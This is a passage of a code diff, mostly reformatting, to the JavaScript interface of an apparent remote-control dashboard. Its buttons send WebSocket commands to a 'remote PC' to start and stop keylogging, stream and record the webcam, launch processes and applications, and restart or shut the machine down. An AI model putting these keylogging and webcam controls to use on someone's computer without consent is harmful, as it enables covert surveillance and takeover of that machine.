+            webcamPlaceholder.parentElement.classList.remove('hidden');
+            btnStartWebcamStream.classList.remove('hidden');
+            btnStopWebcamStream.classList.add('hidden');
+            btnStartRecord.classList.remove('hidden');
         };
 
         // Keylog
         keylogToggle.onchange = e => {
-            if(!ws) return (e.target.checked=false, alert('Connect first'));
-            sendWsMessage({command: e.target.checked ? 'start_keylog' : 'stop_keylog'});
+            if (!ws) return (e.target.checked = false, alert('Connect first'));
+            sendWsMessage({ command: e.target.checked ? 'start_keylog' : 'stop_keylog' });
             keylogOutput.textContent = e.target.checked ? 'Starting...' : 'Stopped.';
             isKeylogClean = true;
         };
-        if(btnClearKeylog) btnClearKeylog.onclick = () => { keylogOutput.textContent = 'Cleared.'; isKeylogClean = true; };
+        if (btnClearKeylog) btnClearKeylog.onclick = () => {
+            keylogOutput.textContent = 'Cleared.';
+            isKeylogClean = true;
+        };
 
         // Modals Common
         $('#btn-start-process').onclick = () => showModal('modal-start-process');
         $('#btn-start-app').onclick = () => showModal('modal-start-app');
-        
+
         $('#modal-start-process [data-action="confirm"]').onclick = () => {
-            sendWsMessage({command:'start_process', path: $('#input-proc-path').value, args: $('#input-proc-args').value}); handleCloseModal();
+            sendWsMessage({ command: 'start_process', path: $('#input-proc-path').value, args: $('#input-proc-args').value });
+            handleCloseModal();
         };
         $('#modal-start-app [data-action="confirm"]').onclick = () => {
-            sendWsMessage({command:'start_application', app_name: $('#input-app-name').value}); handleCloseModal();
+            sendWsMessage({ command: 'start_application', app_name: $('#input-app-name').value });
+            handleCloseModal();
         };
 
-        if($('#btn-system-restart')) $('#btn-system-restart').onclick = () => showConfirmModal('Restart', 'Restart remote PC?', 'danger', () => sendWsMessage({command: 'system_restart'}));
-        if($('#btn-system-shutdown')) $('#btn-system-shutdown').onclick = () => showConfirmModal('Shutdown', 'Shutdown remote PC?', 'danger', () => sendWsMessage({command: 'system_shutdown'}));
+        if ($('#btn-system-restart')) $('#btn-system-restart').onclick = () => showConfirmModal('Restart', 'Restart remote PC?', 'danger', () => sendWsMessage({ command: 'system_restart' }));
+        if ($('#btn-system-shutdown')) $('#btn-system-shutdown').onclick = () => showConfirmModal('Shutdown', 'Shutdown remote PC?', 'danger', () => sendWsMessage({ command: 'system_shutdown' }));
 
         // Theme & Traffic
-        $('.dot.red').onclick = () => { if(ws) disconnectWs(); };
-        $('.dot.yellow').onclick = () => { if(themeToggle) themeToggle.click(); }; 
+        $('.dot.red').onclick = () => { if (ws) disconnectWs(); };
+        $('.dot.yellow').onclick = () => { if (themeToggle) themeToggle.click(); };
         $('.dot.green').onclick = () => document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();
 
-        if(themeToggle) {
+        if (themeToggle) {
             themeToggle.onchange = e => {
                 document.body.className = e.target.checked ? 'dark-theme' : '';
                 localStorage.setItem('theme', e.target.checked ? 'dark' : 'light');
             };
-            if(localStorage.getItem('theme') === 'dark') {
+            if (localStorage.getItem('theme') === 'dark') {
                 document.body.classList.add('dark-theme');
                 themeToggle.checked = true;
             }
@@ -841,7 +992,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- START ---
     init();
-    
-    setTimeout(() => { if(typeof feather !== 'undefined') feather.replace(); }, 500);
+
+    setTimeout(() => { if (typeof feather !== 'undefined') feather.replace(); }, 500);
     showView(currentView);
 });
